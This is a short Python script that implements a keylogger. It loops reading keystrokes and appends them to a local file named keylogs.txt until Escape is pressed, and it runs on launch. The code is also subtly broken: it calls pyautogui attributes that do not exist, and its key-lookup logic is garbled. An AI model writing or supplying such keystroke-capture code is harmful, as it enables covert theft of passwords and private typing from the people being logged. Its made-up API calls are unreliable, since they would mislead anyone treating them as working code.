import pyautogui

def record_keystrokes():
    file = open('keylogs.txt', 'a')
    while True:
        try:
            key = pyautogui.KEYBOARD_LIST[pyautogui.keyboard.read_key()]
            if key == '\x1b':
                break
            elif key.isalpha():
                file.write(key)
            else:
                file.write('[' + key + ']')
        except KeyboardInterrupt:
            pass
    file.close()

record_keystrokes()
